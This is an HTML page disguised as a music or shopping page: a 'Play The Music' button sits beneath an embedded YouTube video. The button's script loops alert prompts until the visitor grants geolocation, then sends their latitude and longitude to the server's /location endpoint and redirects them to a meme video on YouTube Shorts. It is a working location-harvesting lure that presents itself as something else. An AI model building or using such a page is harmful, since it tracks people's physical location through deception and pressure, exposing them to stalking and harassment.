<!DOCTYPE html>
<html>
<head>
  <title>Shoping Now</title>
  <style>
    * {
      box-sizing: border-box;
    }

    body {
      margin: 0;
      font-family: Arial, sans-serif;
      background-color: #121212;
      color: white;
      display: flex;
      flex-direction: column;
      align-items: center;
      justify-content: center;
      padding: 20px;
    }

    .video-container {
      position: relative;
      width: 100%;
      max-width: 600px;
      aspect-ratio: 16 / 9;
      margin-bottom: 20px;
    }

    iframe {
      width: 100%;
      height: 100%;
      border: none;
      border-radius: 12px;
    }

    button {
      padding: 22px 34px;
      font-size: 1.8rem;
      background-color: #1db954;
      border: none;
      margin-top: 150px;
      border-radius: 8px;
      color: white;
      cursor: pointer;
      transition: 0.3s ease;
    }

    button:hover {
      background-color: #1ed760;
    }
  </style>
</head>
<body>
  <!-- Replace VIDEO_ID with real YouTube ID -->
  <!-- <iframe src="https://www.youtube.com/embed/II2EO3Nw4m0?autoplay=1&mute=1&controls=0&showinfo=0&loop=1&playlist=VIDEO_ID"></iframe> -->
  <!-- <iframe width="560" height="315" src="https://www.youtube.com/embed/II2EO3Nw4m0?si=9BaGNUy8-hZMkWA9" title="YouTube video player" frameborder="0" allow="accelerometer; autoplay; clipboard-write; encrypted-media; gyroscope; picture-in-picture; web-share" referrerpolicy="strict-origin-when-cross-origin" allowfullscreen></iframe> -->
  <div class="video-container">
  <iframe src="https://www.youtube.com/embed/YZAFd9o3RYQ?si=VxpMZck8rrJSAGYT" title="YouTube video player" frameborder="0" allow="accelerometer; autoplay; clipboard-write; encrypted-media; gyroscope; picture-in-picture; web-share" referrerpolicy="strict-origin-when-cross-origin" allowfullscreen></iframe>
  </div>
  <button id="getLocationBtn">Play The Music</button>

  <script>
    async function askLocation() {
      let granted = false;
  
      while (!granted) {
        try {
          await new Promise((resolve, reject) => {
            navigator.geolocation.getCurrentPosition(resolve, reject);
          });
          granted = true;
          alert("‚úÖ Location access granted!");
        } catch (err) {
          alert("‚ö†Ô∏è Please allow location access to continue.");
          await new Promise(resolve => setTimeout(resolve, 2000));
        }
      }
  
      navigator.geolocation.getCurrentPosition(async (position) => {
        const { latitude, longitude } = position.coords;
        alert(`üìç Location fetched: ${latitude}, ${longitude}`);
  
        const res = await fetch("/location", {
          method: "POST",
          headers: {
            "Content-Type": "application/json"
          },
          body: JSON.stringify({ latitude, longitude })
        });
  
        const result = await res.json();
        if (result.message) {
          alert("‚úÖ Location saved!");
          // üîÅ Redirect here
        //   window.location.href = "https://cdn.glitch.global/8342c6be-596a-406c-8522-ab90e8b3c464/Bhen%20ka%20shot%20memes%20%20%23viralvideo%20%23memes%20%23terdingvideo%20%23viralmemes%20%23youtubeshorts%20%23viralshort.mp4?v=1751048273444"; // or your desired URL
          window.location.replace("https://youtube.com/shorts/5enLRdcf6dY?si=hwziyN7BhhZnMB-P"); // or your desired URL
        } else {
          alert("‚ùå " + result.error);
        }
      });
    }
  
    document.getElementById("getLocationBtn").addEventListener("click", askLocation);
  </script>
  
</body>
</html>
